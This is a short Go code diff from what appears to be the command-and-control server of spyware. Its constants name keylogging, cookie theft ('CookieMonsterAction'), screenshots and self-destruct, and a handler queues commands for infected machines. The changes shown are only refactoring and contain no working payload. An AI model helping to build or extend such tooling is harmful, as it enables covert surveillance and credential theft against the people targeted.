@@ -40,7 +40,7 @@ const (
 	CookieMonsterAction = "cookies"
 	ScreenshotAction    = "screenshot"
 	SelfDestructAction  = "self-destruct"
-	StopAction          = "stop (keylog|lazyKeylog)"
+	StopAction          = "stop-(keylog|lazyKeylog)"
 
 	KeylogFilename     = "keylog.txt"
 	ScreenshotFilename = "ss.png"
@@ -151,7 +151,6 @@ func main() {
 			CommandsStack = append(CommandsStack, command)
 			context.JSON(http.StatusOK, struct{}{})
 			return
-
 		}
 		context.JSON(http.StatusNotFound, gin.H{
 			ActionKey: ErrorMessage,
@@ -322,17 +321,4 @@ func getTextFromFilePath(filePath string) (string, error) {
 		s, _, e = r.ReadLine()
 	}
 	return rez, nil
-}
-
-func Readln(r *bufio.Reader) (string, error) {
-	var (
-		isPrefix bool  = true
-		err      error = nil
-		line, ln []byte
-	)
-	for isPrefix && err == nil {
-		line, isPrefix, err = r.ReadLine()
-		ln = append(ln, line...)
-	}
-	return string(ln), err
 }
